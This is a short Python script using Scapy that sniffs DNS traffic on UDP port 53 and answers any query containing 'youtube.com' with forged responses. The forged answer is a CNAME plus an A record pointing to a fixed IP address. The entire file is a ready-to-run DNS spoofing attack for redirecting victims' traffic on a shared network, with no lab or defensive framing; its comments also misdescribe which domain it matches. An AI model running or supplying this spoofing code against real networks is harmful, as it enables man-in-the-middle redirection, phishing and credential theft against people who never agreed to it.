from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

def dns_spoof(packet):
    # Check if the packet is a DNS query (qr=0)
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        qname = packet.getlayer(DNS).qd.qname.decode('utf-8')

        # Match the domain we're spoofing (accounts.youtube.com)
        if "youtube.com" in qname:
            print(f"[+] Spoofing DNS response for {qname}")
            
            # Construct the spoofed DNS response
            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                          DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                              # CNAME record for accounts.youtube.com
                              an=DNSRR(rrname="youtube.com", type="CNAME", ttl=10, rdata="www3.l.google.com") /
                              # A record for www3.l.google.com resolving to the spoofed IP address
                              DNSRR(rrname="www3.l.google.com", type="A", ttl=10, rdata="142.250.196.174"))
            
            # Send the spoofed DNS response
            send(spoofed_pkt, verbose=0)
            print(f"[+] Sent spoofed response: {qname} -> {spoofed_pkt[DNSRR].rdata}")

# Start sniffing for DNS requests
print(f"[*] Sniffing DNS requests...")
sniff(filter="udp port 53", prn=dns_spoof)
